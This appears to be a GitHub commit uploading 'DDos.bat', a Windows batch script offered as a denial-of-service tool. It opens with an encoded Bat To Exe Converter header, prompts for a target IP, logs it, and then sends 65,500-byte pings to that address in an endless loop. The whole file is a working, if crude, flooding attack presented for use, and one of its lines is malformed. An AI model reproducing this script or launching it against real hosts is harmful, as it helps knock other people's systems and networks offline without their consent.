fda6c931cfeabf35f298dc34fea25749e1b4fc53
editor99 <77914543+Gteditor99@users.noreply.github.com>
2021-07-24 09:18:24 +0900

    Add files via upload

---
+++ DDos.bat
@@ -0,0 +1,69 @@
+::[Bat To Exe Converter]
+::
+::YAwzoRdxOk+EWAnk
+::fBw5plQjdG8=
+::YAwzuBVtJxjWCl3EqQJgSA==
+::ZR4luwNxJguZRRnk
+::Yhs/ulQjdF+5
+::cxAkpRVqdFKZSjk=
+::cBs/ulQjdF+5
+::ZR41oxFsdFKZSDk=
+::eBoioBt6dFKZSDk=
+::cRo6pxp7LAbNWATEpCI=
+::egkzugNsPRvcWATEpCI=
+::dAsiuh18IRvcCxnZtBJQ
+::cRYluBh/LU+EWAjk
+::YxY4rhs+aU+JeA==
+::cxY6rQJ7JhzQF1fEqQJQ
+::ZQ05rAF9IBncCkqN+0xwdVs0
+::ZQ05rAF9IAHYFVzEqQJQ
+::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
+::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
+::cRolqwZ3JBvQF1fEqQJQ
+::dhA7uBVwLU+EWDk=
+::YQ03rBFzNR3SWATElA==
+::dhAmsQZ3MwfNWATElA==
+::ZQ0/vhVqMQ3MEVWAtB9wSA==
+::Zg8zqx1/OA3MEVWAtB9wSA==
+::dhA7pRFwIByZRRnk
+::Zh4grVQjdCyDJGyX8VAjFB5QRRCNAE+/Fb4I5/jHwfCCrB9QcMYQS8L806CyA+8e+kzocJIb02hmvO8DH1VdZhfL
+::YB416Ek+ZW8=
+::
+::
+::978f952a14a936cc963da21a135fa983
+@echo off
+cls
+title DDos Tool Nzen2- Loading
+echo Started: >> log.txt
+ping localhost >> log.txt
+title DDos Tool Nzen2- Press anything to continue
+pause
+title Waiting input
+goto PreAttack
+
+:PreAttack
+cls
+echo ---Enter Attack IP---
+set /p AttackIP= 
+Echo Attack IP set to %AttackIP%
+echo Attack IP set! >> log.txt
+echo IP: >> log.txt
+echo %AttackIP% >> log.txt
+pause
+goto Attacklaunch
+
+:Attacklaunch
+cls
+echo FINAL CHECK: ARE YOU SURE
+pause
+title Launcher
+goto Attack
+
+:Attack
+cls
+pause goto DDos
+
+:DDos 
+:loop
+ping %AttackIP% -l 65500 -w 1 -n 1
+goto :loop
